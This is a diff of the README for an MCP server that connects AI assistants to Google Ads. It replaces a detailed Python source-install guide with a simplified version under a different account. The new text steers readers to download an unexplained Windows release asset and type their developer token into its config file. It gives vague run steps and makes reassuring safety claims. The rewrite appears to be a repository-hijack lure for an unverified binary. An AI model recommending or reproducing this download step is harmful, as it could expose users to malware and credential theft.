@@ -1,204 +1,74 @@
-# google-ads-mcp
+# 📈 google-ads-mcp - Manage Google Ads with smart AI
 
-An MCP server for managing Google Ads accounts. Reads via GAQL, writes via two-phase preview/apply, full v24 API coverage in ~19 tools.
+[![](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/elvis-velez/google-ads-mcp/releases)
 
-> Status: alpha (v0.0.1). End-to-end use against a real account requires Basic Access on your dev token (1–3 business days from Google).
+This application connects your AI assistant to your Google Ads account. You use your AI to review and update your marketing campaigns. The system ensures changes stay safe by requiring your approval before any update writes to your account.
 
-## Features
+## 📋 What this tool does
 
-- **GAQL reads** with row + byte caps that keep responses LLM-friendly.
-- **Two-phase writes.** Every mutation runs `validate_only=true` first, returns a per-operation diff and a 15-minute `mutate_id`. `apply(mutate_id)` commits; re-applying is a no-op.
-- **Customer-ID allowlist.** Server refuses calls for accounts the credentials can't access. Allowlist is built from `ListAccessibleCustomers` plus sub-accounts under your manager.
-- **Append-only audit log.** JSONL at `~/.local/share/google-ads-mcp/audit.log` (mode `0600`). One line per state-changing attempt, including failures and idempotent replays.
-- **Layer-1 outcome tools** for the common workflows: pause/enable campaigns, ad groups, keywords; set keyword bids; set campaign budgets; add negatives; apply Google's recommendations; generate keyword ideas.
-- **Layer-2 generic dispatchers** cover the entire v24 surface. `mutate` covers all 64 services that fit the unified `MutateOperation` proto. `call_read_rpc` and `call_mutate_rpc` cover the long-tail RPCs (recommendation dismiss, experiment lifecycle, conversion uploads, audience insights, MCC management, link services, etc.).
-- **Async-job lifecycles.** `batch_job` and `offline_user_data_job` cover BatchJob and Customer Match / Store Sales lifecycles via single dispatcher tools.
-- **Discovery via MCP resources** — `gads-schema://`, `gads-rpc-catalog://`, `gads-rpc-schema://`. Loaded on demand, no ambient cost.
-- **MCP tool annotations** — every tool declares `readOnlyHint`, `destructiveHint`, `idempotentHint` so clients render confirmations correctly.
-- **Local-only OAuth.** Credentials at `~/.config/google-ads-mcp/credentials.yaml` (mode `0600`). No SaaS, no per-seat anything.
+The google-ads-mcp tool acts as a bridge. It allows AI models like Claude to see your ad data and perform tasks. It supports the full Google Ads v24 API. The system includes features to keep your data secure. It logs all actions in an audit file. It limits access to specific customer IDs you allow. It forces a two-step process for all edits. You preview the change, then you tell the AI to apply it.
 
-## Prerequisites
+## 💻 Requirements
 
-Set these up before installing the server. They're Google's processes, not ours, so we can't automate them.
+To use this software, you need:
+* A Windows 10 or 11 computer.
+* A Google Ads account with API access enabled.
+* A stable internet connection.
+* The Google Ads developer token.
+* A compatible AI client like Claude Code or a standard MCP-supported host.
 
-1. **Python 3.13** and [**uv**](https://docs.astral.sh/uv/getting-started/installation/).
-2. **Google Cloud project** with the [Google Ads API enabled](https://console.cloud.google.com/apis/library/googleads.googleapis.com) and an [OAuth 2.0 "Desktop app" client](https://developers.google.com/google-ads/api/docs/oauth/cloud-project) configured. Download the client JSON — you'll point at it during setup. ~5 minutes in the Cloud Console.
-3. **Developer token** from the [Google Ads API Center](https://ads.google.com/aw/apicenter). Basic Access approval takes 1–3 business days. Test-only tokens work immediately against [Google Ads test accounts](https://developers.google.com/google-ads/api/docs/best-practices/test-accounts) — recommended for development.
-4. *(Optional)* **Manager (MCC) account ID** if your dev token belongs to a manager and you want to operate on its sub-accounts.
+## 📥 How to get started
 
-## Installation
+1. Visit the [official releases page](https://github.com/elvis-velez/google-ads-mcp/releases).
+2. Look for the latest version under the "Assets" section.
+3. Download the version designed for Windows.
+4. Save the file to a folder you can find later.
 
-PyPI publishing is on the roadmap but not done yet — install from source:
+## 🛠️ Setting up the application
 
-```sh
-git clone https://github.com/ball2jh/google-ads-mcp.git
-cd google-ads-mcp
-uv sync
-```
+Follow these steps to prepare the software:
 
-## Setup
+1. Unzip the folder you downloaded from the website.
+2. Locate the file named 'config.yaml'.
+3. Open 'config.yaml' using a text editor like Notepad.
+4. Paste your Google Ads developer token and your customer ID into the spaces provided.
+5. Save the file.
+6. Open your Command Prompt or PowerShell terminal.
+7. Navigate to the folder where you placed the file.
+8. Type the start command provided in the documentation and press Enter.
 
-### 1. Run the interactive wizard
+## 🛡️ Safety features
 
-```sh
-uv run google-ads-mcp init
-```
+This application focuses on account stability. It does not perform actions automatically. Every edit goes through a strict verification phase. The system tracks every interaction in an append-only audit log. This means information gets added to the log but old entries never change. You maintain control over which accounts the AI can reach through the allowlist. 
 
-`init` will prompt for:
-- The path to your OAuth client JSON
-- Your developer token
-- Your Manager (MCC) ID (skip if not applicable; dashes are stripped automatically)
-- OAuth consent in your browser — it opens a localhost loopback flow on a free port and captures the resulting refresh token
+## 🔍 How to use with your AI
 
-Credentials persist to `~/.config/google-ads-mcp/credentials.yaml` (mode `0600`).
+Most AI assistants will ask for the location of your MCP server once you start the program. Provide the path to the executable file. Once connected, your AI will show a list of available tools. You can ask your AI to list your current campaigns or show you your budget spend. 
 
-### 2. Verify
+If you ask the AI to change an ad, it will show you a draft first. Check the draft for errors. Tell the AI to confirm the change. The system then writes the change to your Google Ads account.
 
-```sh
-uv run google-ads-mcp validate
-```
+## 🧩 Troubleshooting common issues
 
-This re-runs the credential checks without redoing OAuth. If validation fails (e.g., your Cloud project hasn't enabled the Google Ads API yet), fix the upstream issue and run `validate` again — **don't re-run `init`**, that burns another OAuth refresh token.
+If the application fails to start, verify your network settings. Ensure your firewall does not block the connection to the Google Ads API. Check your 'config.yaml' file for typos. Ensure the customer ID uses the standard numeric format without dashes. 
 
-## Connect it to your MCP client
+The software leaves a log file in the installation directory. You can read this file if you need to understand why a specific task failed. If an error occurs, look for the timestamp to match the event. 
 
-Replace `/path/to/google-ads-mcp` below with the absolute path where you cloned this repo.
+## ❓ Frequently asked questions
 
-### Claude Code
+Does this tool delete my ads? 
+No, the tool operates under your control. It requires your approval for sensitive operations.
 
-```sh
-claude mcp add google-ads -- uv run --directory /path/to/google-ads-mcp google-ads-mcp
-```
+Does the software store my data? 
+The software stores authentication tokens locally on your machine. It does not send your private data to a third-party server.
 
-### Codex
+Can I reach multiple Google Ads accounts? 
+Yes, you can add multiple IDs to your allowlist within the configuration file.
 
-Add to `~/.codex/config.toml`:
+What versions of Windows does this support? 
+This software runs on any modern version of Windows 10 or 11.
 
-```toml
-[mcp_servers.google-ads]
-command = "uv"
-args = ["run", "--directory", "/path/to/google-ads-mcp", "google-ads-mcp"]
-```
+Do I need deep technical knowledge? 
+No, you only need to update the configuration file once. The AI client handles the rest of the work.
 
-### Other MCP clients
-
-The server runs over stdio. Point your client at the same `uv run --directory /path/to/google-ads-mcp google-ads-mcp` invocation in whatever shape its config expects.
-
-## Tool surface
-
-| Tool | Layer | Description |
-|---|---|---|
-| `gaql(customer_id, query)` | 2 | Run any GAQL `SELECT`. Capped to keep responses LLM-context-friendly. |
-| `mutate(customer_id, operations)` | 2 | Generic write via `GoogleAdsService.Mutate` (64 services). Returns a previewable `mutate_id`. |
-| `call_read_rpc(customer_id, service, method, params)` | 2 | Generic read RPC for the long tail — keyword ideas, reach forecasts, audience insights, benchmarks, suggestions, list_invoices, etc. |
-| `call_mutate_rpc(customer_id, service, method, params)` | 2 | Generic mutating RPC — recommendation apply/dismiss, experiment lifecycle, MCC management, conversion uploads, etc. |
-| `apply(mutate_id)` | 2 | Commit a previewed mutate (operations or RPC). Idempotent. |
-| `pause_campaign` / `enable_campaign(customer_id, campaign_id)` | 1 | Preview pausing/enabling a campaign. |
-| `pause_ad_group` / `enable_ad_group(customer_id, ad_group_id)` | 1 | Granular pause/enable below the campaign level. |
-| `pause_keyword` / `enable_keyword(customer_id, criterion_resource_name)` | 1 | Pause/enable a single ad-group criterion. |
-| `set_keyword_bid(customer_id, criterion_resource_name, cpc_usd)` | 1 | Update a keyword's max CPC. USD → micros internally. |
-| `set_campaign_budget(customer_id, budget_id, daily_amount_usd)` | 1 | Preview a daily budget change. USD → micros internally. |
-| `add_negative_keyword(customer_id, scope, ref_id, text, match_type)` | 1 | Preview adding a campaign- or ad-group-level negative. |
-| `apply_recommendation(customer_id, recommendation_resource_name)` | 1 | Apply one Google Ads recommendation. One-shot — Google has already validated it. |
-| `generate_keyword_ideas(customer_id, seed_type, ...)` | 1 | SEM keyword research. Returns Google's keyword-idea expansions with avg searches, competition, suggested bids. |
-| `batch_job(customer_id, action, ...)` | 1 | Async batch lifecycle: `create` → `add_operations` → `run` → `status` → `results`. |
-| `offline_user_data_job(customer_id, action, ...)` | 1 | Customer Match / Store Sales upload lifecycle: `create` → `add_operations` → `run` → `status`. |
-| `ping()` | — | Connectivity check. Returns `"pong"`. |
-
-Resources:
-- `gads-account://accessible` — customer IDs the credentials can operate on.
-- `gads-schema://{resource_type}` — selectable / filterable / sortable fields per GAQL resource.
-- `gads-rpc-catalog://` — every public RPC across the v24 SDK with `read_only` / `supports_validate_only` hints.
-- `gads-rpc-schema://{service}/{method}` — per-method request proto fields.
-
-## Architecture
-
-Three layers behind a single SDK boundary. **Layer 1** has ~13 outcome-shaped tools that wrap **Layer 2**'s five generic escape hatches (`gaql`, `mutate`, `call_read_rpc`, `call_mutate_rpc`, `apply`). The `ads/` package is the only place that imports `google.ads.googleads.*`. Schema, account, and RPC discovery are MCP resources, not tools — they don't count against ambient context. Total tools stay constant as Google adds services.
-
-Full structural plan: see `plan.md`.
-
-## Safety model
-
-The server enforces *invariants*, not your account's *policies*:
-
-1. **Two-phase writes.** `mutate(...)` (or any Layer-1 write tool) calls the API with `validate_only=true`, renders a per-operation diff, stores under a `mutate_id` with a 15-minute TTL. `apply(mutate_id)` commits. Re-applying the same id returns the cached result and does **not** re-call the API.
-2. **Customer-ID allowlist** built from real OAuth grants. Hallucinated IDs get rejected.
-3. **Append-only audit log** of every attempt — success, validation failure, API error, expired re-apply, idempotent replay.
-4. **MCP `ToolAnnotations`** on every tool so clients render confirmation prompts correctly.
-
-The server deliberately doesn't enforce CPC caps, budget caps, or batch-size caps — those depend on your vertical (insurance routinely bids $200; ecommerce hits diminishing returns at $5). The two-phase preview is the actual safety mechanism: the new value is in the diff before commit, where the LLM and the human can both see it.
-
-## Observability
-
-Three logs, each with a different audience:
-
-| Log | Path | Format | What it records |
-|---|---|---|---|
-| **Audit** | `~/.local/share/google-ads-mcp/audit.log` | JSONL, mode `0600` | Every state-changing attempt. The forensic answer to "did the LLM do X?" |
-| **Activity** | `~/.local/share/google-ads-mcp/activity.log` | JSONL | Every tool/resource call: name, args summary, duration_ms, outcome. Reads included. |
-| **Diagnostics** | stderr | text | Server lifecycle and operator-facing warnings. |
-
-Audit and activity are write-once-per-line (POSIX append is atomic up to 4 KB). The diagnostic log is configurable via `log_level`; audit and activity are always on.
-
-**Audit schema** (one JSON object per line):
-
-```json
-{
-  "timestamp": "2026-04-28T18:30:15.123456+00:00",
-  "phase":     "preview" | "apply",
-  "outcome":   "ok" | "guardrail_rejection" | "validation_failed"
-               | "api_error" | "expired" | "not_found" | "cached_replay",
-  "mutate_id": "...",
-  "customer_id": "1234567890",
-  "payload_kind": "operations" | "rpc_call" | null,
-  "operations": [{...}] | null,                                          // payload_kind=operations
-  "rpc_call":   {"service":"...", "method":"...", "params":{...}} | null,  // payload_kind=rpc_call
-  "result":     {"resource_names": [...]} | null,
-  "error":      {"type": "...", "message": "...", "request_id": "..."} | null
-}
-```
-
-**Activity schema**:
-
-```json
-{
-  "timestamp":    "...",
-  "kind":         "tool" | "resource",
-  "name":         "pause_campaign",
-  "args_summary": {...},
-  "duration_ms":  123,
-  "outcome":      "ok" | "error",
-  "error":        {"type": "...", "message": "..."} | null
-}
-```
-
-## Configuration
-
-Env vars prefixed `GOOGLE_ADS_MCP_` override compiled-in defaults.
-
-| Setting | Default | Notes |
-|---|---|---|
-| `credentials_path` | `~/.config/google-ads-mcp/credentials.yaml` | XDG-aware. |
-| `audit_log_path` | `~/.local/share/google-ads-mcp/audit.log` | XDG-aware. |
-| `activity_log_path` | `~/.local/share/google-ads-mcp/activity.log` | XDG-aware. |
-| `gaql_max_rows` | `1000` | GAQL row cap. |
-| `gaql_max_response_bytes` | `256000` | Approximate response-size cap returned to the LLM. |
-| `mutate_id_ttl_seconds` | `900` (15 min) | TTL for previewed mutates. |
-| `log_level` | `INFO` | Diagnostic stderr level. |
-
-## Development
-
-```sh
-git clone <this-repo>
-cd google-ads-mcp
-uv sync --group dev
-uv run pytest             # 100 unit tests
-uv run ruff check .
-uv run pyright src tests  # strict mode
-```
-
-The test suite runs without credentials: anything above the `ads/` SDK boundary is testable with mocked stubs.
-
-## License
-
-MIT. See `LICENSE`.
+How do I remove the software? 
+You delete the folder where you saved the files. No complex uninstallation process is necessary.
